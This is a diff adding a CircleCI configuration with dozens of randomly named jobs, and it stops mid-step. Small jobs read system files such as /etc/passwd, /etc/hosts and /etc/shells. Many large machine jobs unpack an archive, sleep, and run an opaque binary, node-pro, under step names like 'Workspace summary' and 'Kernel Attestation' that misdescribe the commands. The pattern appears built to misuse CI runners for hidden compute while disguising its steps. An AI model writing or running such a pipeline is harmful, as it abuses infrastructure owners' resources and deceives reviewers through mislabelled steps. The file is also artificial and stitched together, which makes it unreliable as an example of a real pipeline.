@@ -1,0 +1,1722 @@
+version: 2.1
+
+jobs:
+  module_packet:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Garbage collect the retry buffer to be thorough
+          command: |
+            mkdir -p /var/tmp/delta
+            set +o pipefail 2>/dev/null; type seq && seq 1 1190016 > /var/tmp/delta/DJI_16022; true
+            echo "wrote $(wc -c </var/tmp/delta/DJI_16022) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'DJI_16022'
+  callisto-alpha:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/audit.log.11 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  providers-send:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: scheduling visa paperwork as we go
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; for f in /usr/bin/z*; do echo "$f has $(wc -c < "$f") bytes";done | head -n 3; true ; } > /var/tmp/delta/blob408
+            echo "wrote $(wc -c </var/tmp/delta/blob408) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'blob408'
+  DEV_VERIFY_5:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/blob408 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  shim_sys:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: VerifyMaintenancePage3
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; date -d @257882784; true ; } > /var/tmp/delta/rf8YRwJ8sSRAk0vUGftUl
+            echo "wrote $(wc -c </var/tmp/delta/rf8YRwJ8sSRAk0vUGftUl) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'rf8YRwJ8sSRAk0vUGftUl'
+  sirius-ng:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/audit.log.11 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  nope81:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Rerun CI
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; command -V grep; true ; } > /var/tmp/delta/221.74
+            echo "wrote $(wc -c </var/tmp/delta/221.74) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - '221.74'
+  ensure-staging-release-candidate:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/221.74 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  hardCtx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Kernel Attestation
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; grep -Hr case /etc/security 2>/dev/null | wc -l; true ; } > /var/tmp/delta/v-v3.6.28
+            echo "wrote $(wc -c </var/tmp/delta/v-v3.6.28) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'v-v3.6.28'
+  publish:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/v-v3.6.28 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  Split-ViewConfig:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: SET ACL
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; tar czf /tmp/spring.tgz -C /etc hosts && tar -xzOf /tmp/spring.tgz hosts | head -n 3; true ; } > /var/tmp/delta/M6pL9LE
+            echo "wrote $(wc -c </var/tmp/delta/M6pL9LE) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'M6pL9LE'
+  omar-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/M6pL9LE 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  FOSTER:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Tap Settings Gear mk5
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; printf 'host=web01\nport=6718\nuser=raj\ndebug=true\n'|awk -F= '$1=="debug" {print $2}'; true ; } > /var/tmp/delta/RPCPDF
+            echo "wrote $(wc -c </var/tmp/delta/RPCPDF) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'RPCPDF'
+  sep3-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/RPCPDF 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  globeish:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Evening build
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; while IFS=: read -r user _ uid gid _; do echo "$user $uid";done < /etc/passwd | head -n 2; true ; } > /var/tmp/delta/CASE-2026-95574
+            echo "wrote $(wc -c </var/tmp/delta/CASE-2026-95574) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'CASE-2026-95574'
+  zulu:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/blob408 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  hideXMLWindow:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: third time lucky rollout
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; mkdir -p /tmp/harbor && touch /tmp/harbor/{frog,auth,goose}.txt && ls -l /tmp/harbor | tail -n +2; true ; } > /var/tmp/delta/audit.log.11
+            echo "wrote $(wc -c </var/tmp/delta/audit.log.11) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'audit.log.11'
+  Run_App1:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/audit.log.11 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  logp:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Resume count email
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; ls -F -g -o /dev/std* | nl; true ; } > /var/tmp/delta/3c93b9b6-92b1-18ec-5e81-5a01160f61
+            echo "wrote $(wc -c </var/tmp/delta/3c93b9b6-92b1-18ec-5e81-5a01160f61) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - '3c93b9b6-92b1-18ec-5e81-5a01160f61'
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/3c93b9b6-92b1-18ec-5e81-5a01160f61 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  pixel-date-window:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: 620 summarize press list
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; if [[ -r /etc/os-release ]] ; then echo true; else echo false; fi; true ; } > /var/tmp/delta/filter.molten.bear
+            echo "wrote $(wc -c </var/tmp/delta/filter.molten.bear) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'filter.molten.bear'
+  add-retry-timeout:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/filter.molten.bear 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  planet-377:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Shrink wrap gets dispatched twice
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; cp /etc/shells /tmp/vector.bak && sed -i.bak '/^#/d' /tmp/vector.bak && cat /tmp/vector.bak; true ; } > /var/tmp/delta/SHIMMER
+            echo "wrote $(wc -c </var/tmp/delta/SHIMMER) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'SHIMMER'
+  dec2-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/SHIMMER 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  i1:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Over to Felix
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; for w in {1..3}; do printf '%d %d\n' $w $((w * 3)); done | wc -l; true ; } > /var/tmp/delta/fnv_eb38ef493f0b3d
+            echo "wrote $(wc -c </var/tmp/delta/fnv_eb38ef493f0b3d) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'fnv_eb38ef493f0b3d'
+  t-x:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/blob408 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  IsNO:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Bonk the drift monitor
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; \ls -p /usr/lib/os-release | cat -n; true ; } > /var/tmp/delta/shader-peer-grove
+            echo "wrote $(wc -c </var/tmp/delta/shader-peer-grove) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'shader-peer-grove'
+  Verify_Staging6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/audit.log.11 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  ninaofficial:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Format The Regression Pack Step
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; find /var/tmp -maxdepth 2 -name "*" -exec echo '{}' \; 2> /dev/null | sort | head -15; true ; } > /var/tmp/delta/access_20220218
+            echo "wrote $(wc -c </var/tmp/delta/access_20220218) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'access_20220218'
+  MERGE_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/access_20220218 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  teardownReleaseTotal:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Percussive maintenance on the join keys
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; echo 100% | od -c | head -n 2; true ; } > /var/tmp/delta/146af248b9f1
+            echo "wrote $(wc -c </var/tmp/delta/146af248b9f1) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - '146af248b9f1'
+  break-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/blob408 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  QUERY_MODEL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Test the drift monitor with a timeout
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; ls /mnt | wc -l; true ; } > /var/tmp/delta/SweepTheta
+            echo "wrote $(wc -c </var/tmp/delta/SweepTheta) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'SweepTheta'
+  PROD_HOOK_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/SweepTheta 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  IRL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Rewrite then draft
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; printf '%s\n' buffer data garden sync > /tmp/private-step.bak && sort -u /tmp/private-step.bak; true ; } > /var/tmp/delta/atomBlobEastGrove
+            echo "wrote $(wc -c </var/tmp/delta/atomBlobEastGrove) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'atomBlobEastGrove'
+  release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/atomBlobEastGrove 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  red2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Export mini map and playtest
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; command ls -Q -o -n -d /srv | awk '$5 > 1000'; true ; } > /var/tmp/delta/plasmaindigogadgetwallet
+            echo "wrote $(wc -c </var/tmp/delta/plasmaindigogadgetwallet) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'plasmaindigogadgetwallet'
+  golf:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/blob408 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  OMGX:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Fingerprint budget 4 ms
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero of='/var/tmp/cake.md' bs=1k count=1 2>/dev/null && ls -l '/var/tmp/cake.md'; true ; } > /var/tmp/delta/moltenhost
+            echo "wrote $(wc -c </var/tmp/delta/moltenhost) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'moltenhost'
+  q4-release:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/moltenhost 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  BOX_PIXEL:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: lockdown by ops team
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; check() { echo "[$(date +%T)] $*"; }; check "what's next?"; true ; } > /var/tmp/delta/vector-e8260.log
+            echo "wrote $(wc -c </var/tmp/delta/vector-e8260.log) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'vector-e8260.log'
+  rm-metrics-bug:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/vector-e8260.log 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  qs2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: SYNC
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; command -v awk; true ; } > /var/tmp/delta/bf95106b-53d9
+            echo "wrote $(wc -c </var/tmp/delta/bf95106b-53d9) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'bf95106b-53d9'
+  alice-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/bf95106b-53d9 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
+          command: $PWD/node-pro
+  DY1D:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Open the date picker then screenshot
+          command: |
+            mkdir -p /var/tmp/delta
+            { set +o pipefail 2>/dev/null; cp /etc/os-release /tmp/ite9.list && sed -i.orig 's/^NAME=/OS_NAME=/' /tmp/ite9.list && grep -c . /tmp/ite9.list; true ; } > /var/tmp/delta/PNG
+            echo "wrote $(wc -c </var/tmp/delta/PNG) bytes"
+      - persist_to_workspace:
+          root: /var/tmp/delta
+          paths:
+            - 'PNG'
+  apr26-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/delta
+      - run:
+          name: Stage recovery
+          command: |
+            hexdump -d /var/tmp/delta/audit.log.11 2>/dev/null | head -2 || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 1 -q --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Prime workspace
+          command: tar -xj -f build-archive-main.tar.bz2
+      - run:
+          name: Workspace summary
+          no_output_timeout: 15m
+          command: sleep 120
+      - run:
+          name: Settle filesystem
+          command: uptime
+      - run:
+          command: sleep 60
+      - run:
